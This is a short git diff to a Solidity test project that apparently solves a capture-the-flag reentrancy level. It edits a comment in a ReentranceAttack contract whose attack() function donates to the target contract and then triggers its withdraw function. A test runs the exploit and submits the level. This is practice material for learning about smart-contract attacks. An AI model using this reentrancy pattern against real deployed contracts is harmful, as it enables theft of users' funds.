@@ -17,7 +17,8 @@ contract ReentranceAttack {
   }
 
   function attack() external {
-    // first donate something to be able to pass the require
+    // first donate something to be able to pass the guard,
+    // that is balances[msg.sender] >= _amount
     target.donate{value: 0.001 ether}(address(this));
 
     // then trigger the withdraw function
@@ -48,7 +49,6 @@ contract ReentranceTest is Test {
 
   function testExploit() public {
     attackContract.attack();
-
     utils.submitLevelInstance(challengeAddress);
   }
 }
